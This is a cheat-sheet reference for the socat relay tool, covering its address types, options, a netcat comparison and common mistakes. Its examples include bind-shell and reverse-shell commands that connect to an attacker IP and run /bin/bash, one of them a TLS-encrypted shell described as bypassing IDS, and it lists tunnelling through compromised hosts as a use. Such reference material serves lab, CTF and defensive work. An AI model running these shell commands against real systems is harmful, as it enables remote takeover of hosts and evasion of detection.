# socat

**SOcket CAT** — a multipurpose command-line relay tool for bidirectional data transfer between two endpoints.

## Syntax

```
socat [options] <source-address> <destination-address>
```

## Purpose

Establish bidirectional byte streams between two endpoints, which can be files, pipes, devices, sockets, SSL/TLS connections, or subprocesses. Socat is often described as "netcat with steroids" — it supports advanced features like TLS, SOCKS, proxy, serial lines, and file descriptors.

## Address Types

| Address Type | Syntax | Description |
|-------------|--------|-------------|
| TCP | `TCP:<host>:<port>` | TCP client connection |
| TCP-L | `TCP-L:<port>` | TCP listener |
| UDP | `UDP:<host>:<port>` | UDP |
| UDP-L | `UDP-L:<port>` | UDP listener |
| SSL | `OPENSSL:<host>:<port>` | TLS client |
| SSL-L | `OPENSSL-LISTEN:<port>` | TLS listener |
| PTY | `PTY` | Pseudoterminal |
| EXEC | `EXEC:<command>` | Execute and connect to process |
| FILE | `FILE:<path>` | Open file for reading/writing |
| UNIX | `UNIX-CONNECT:<path>` | Unix domain socket client |
| UNIX-L | `UNIX-LISTEN:<path>` | Unix domain socket listener |

## Common Parameters

| Parameter | Description |
|-----------|-------------|
| `-` | Read from stdin / write to stdout |
| `-v` | Verbose (show data in hex/ASCII) |
| `-d` | Debug output (add more `-d`s for more detail) |
| `-dd` | Print fatal, error, warning, and notice messages |
| `-ddd` | Add info messages |
| `-dddd` | Add debugging messages |
| `reuseaddr` | Allow immediate reuse of address in TIME_WAIT |
| `fork` | Fork after each connection (server mode) |
| `keepalive` | Enable TCP keepalive |
| `retry=N` | Retry connection N times |

## Examples

```bash
# Simple port listener (like netcat)
socat TCP-L:4444 -

# Connect to a remote host
socat - TCP:10.10.10.1:80

# Bind shell (insecure — for CTF/lab only)
### On target:
socat TCP-L:4444 EXEC:/bin/bash

### On attacker:
socat - TCP:target:4444

# Reverse shell (more reliable)
### On attacker (listener):
socat -d -d TCP-L:4444 -

### On target (reverse shell):
socat TCP:10.10.10.5:4444 EXEC:/bin/bash

# Encrypted reverse shell (bypasses IDS)
### On attacker (generate self-signed cert first):
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork -

### On target:
socat OPENSSL:10.10.10.5:4444,verify=0 EXEC:/bin/bash

# Port forwarding
socat TCP-L:8080,fork TCP:10.10.10.1:80

# File transfer (sender)
socat -u FILE:file.zip TCP-L:4444

# File transfer (receiver)
socat -u TCP:10.10.10.5:4444 OPEN:file.zip,creat

# Create a simple HTTP proxy
socat TCP-L:8080,fork TCP:proxy.example.com:3128

# Serial to TCP bridge
socat TCP-L:1234,fork FILE:/dev/ttyUSB0,nonblock,raw,echo=0

# SSL client connection
socat - OPENSSL:example.com:443,verify=1
```

## Socat vs Netcat

| Feature | socat | netcat (nc) |
|---------|-------|-------------|
| SSL/TLS | Built-in | Requires ncat or OpenSSL s_client |
| Forking | `fork` | `-k` |
| Address types | 30+ (file, pipe, exec, serial, etc.) | TCP, UDP, Unix |
| Reconnection | `retry` option | Manual |
| Encryption | SSL/TLS with certificates | None |
| Data modification | `-v` hex dump | Basic |
| Port forwarding | Simple syntax | Requires scripting |

## Common Mistakes

- Forgetting `fork` for persistent listeners — without `fork`, the listener accepts one connection and exits.
- Not using `reuseaddr` — the address remains in TIME_WAIT, preventing reuse for a period.
- Confusing source and destination order — socat uses `<source> <destination>`; the first argument is what socat reads from, the second is what it writes to.
- Using socat without `-d` for debugging — when something fails, the lack of verbose output makes diagnosis difficult.
- Binding to privileged ports (< 1024) without root — socat will fail with permission denied.
- Not specifying `verify=0` for self-signed certificates — SSL handshake fails on verification.

## Real-World Usage

- **Reliable reverse shells:** Bypass firewalls with TLS-encrypted shells.
- **Port forwarding:** Tunnel traffic through compromised hosts.
- **CTF challenges:** Set up listeners, transfer files, create encrypted channels.
- **Serial-to-network bridges:** Connect legacy serial devices to TCP/IP networks.
- **SSL/TLS debugging:** Inspect encrypted traffic with socat's verbose mode.

## Compatibility

| OS | Support | Notes |
|----|---------|-------|
| Linux | Full | Install via apt/yum |
| Windows | Limited | Via Cygwin or WSL |
| macOS | Full | Install via Homebrew |

```bash
# Install on Linux
sudo apt install socat
```
